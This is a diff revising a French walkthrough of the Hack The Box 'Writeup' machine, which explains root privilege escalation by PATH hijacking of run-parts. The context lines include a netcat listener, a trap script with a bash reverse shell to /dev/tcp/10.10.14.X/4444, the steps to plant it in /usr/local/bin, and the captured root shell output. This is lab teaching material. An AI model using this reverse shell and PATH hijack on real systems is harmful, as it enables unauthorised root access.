@@ -611,11 +611,12 @@ Pendant que `pspy64` est en cours d’exécution, tu ouvres une **nouvelle sessi
   run-parts --lsbsysinit /etc/update-motd.d
   ```
 
-Ici, `run-parts` est appelé **sans chemin absolu**, alors que le `PATH` inclut des répertoires accessibles en écriture par `jkr` (`/usr/local/bin`).
+Ici, `run-parts` est appelé **sans chemin absolu**, alors que la variable d’environnement `PATH` inclut des répertoires accessibles en écriture par `jkr`, notamment `/usr/local/bin`.
 
-Cette situation met en évidence une technique d’escalade de privilèges bien connue : le détournement du `PATH`. Lorsqu’une commande est lancée par root sans chemin absolu, le système cherche l’exécutable dans les répertoires listés dans le `PATH`. Si l’un de ces répertoires est accessible en écriture, **un utilisateur peut y placer son propre binaire, qui sera alors exécuté à la place de celui attendu.**
+Cette situation met en évidence une technique d’escalade de privilèges bien connue : le **détournement de `PATH`**.
+ Lorsqu’une commande est lancée par root sans chemin absolu, le système recherche l’exécutable dans les répertoires listés dans le `PATH`. Si l’un de ces répertoires est accessible en écriture, **un utilisateur peut y placer son propre script, qui sera exécuté à la place de celui attendu**.
 
-**C’est une voie royale pour déclencher l’exécution d’un reverse shell avec les privilèges root.**
+Dans ce contexte précis, cela permet de déclencher l’exécution d’un reverse shell avec les privilèges root.
 
 ### Lancement d'un Reverse Shell
 
@@ -633,7 +634,7 @@ nc -lvnp 4444
 
 2. Créer le binaire piégé sur la cible
 
-Sur la machine cible, crée un fichier nommé `run-parts` dans `/usr/local/` :
+Sur la machine cible, commence par créer un fichier nommé `run-parts` dans `/usr/local/` :
 
 ```bash
 cd /usr/local/
@@ -649,7 +650,7 @@ bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
 
 ------
 
-3. Rends le script exécutable
+3. Rends le binaire exécutable
 
 ```bash
 chmod +x run-parts
@@ -657,7 +658,7 @@ chmod +x run-parts
 
 ------
 
-4. copie le script dans /usr/local/bin
+4. Au moment voulu, copie le binaire dans /usr/local/bin
 
    ```bash
    cp run-parts bin/
@@ -665,7 +666,9 @@ chmod +x run-parts
 
    
 
-5. **Immédiatement après**, connecte-toi en ssh depuis un autre terminal dans Kali
+5. Déclenche l'exécution
+
+   **Immédiatement après**, connecte-toi en ssh depuis un autre terminal Kali
 
    ```bash
    ssh jkr@writeup.htb
@@ -674,7 +677,8 @@ chmod +x run-parts
    
 
 Aucune action supplémentaire n’est nécessaire.
-Lors de la connexion SSH, root appellera `run-parts` sans chemin absolu. Le système exécutera alors **ton binaire**, ce qui déclenchera immédiatement le reverse shell.
+Lors de la connexion SSH, un script exécuté avec les privilèges root appelle `run-parts` sans chemin absolu.
+ La variable d’environnement `PATH` plaçant `/usr/local/bin` avant `/bin`, le script `run-parts` que tu as créé est exécuté en priorité.
 
 ------
 
@@ -688,6 +692,8 @@ Dans le terminal Kali, tu obtiens un shell root.
 └─$ nc -lvnp 4444
 
 listening on [any] 4444 ...
+
+
 connect to [10.10.14.156] from (UNKNOWN) [10.129.43.121] 38928
 bash: cannot set terminal process group (6537): Inappropriate ioctl for device
 bash: no job control in this shell
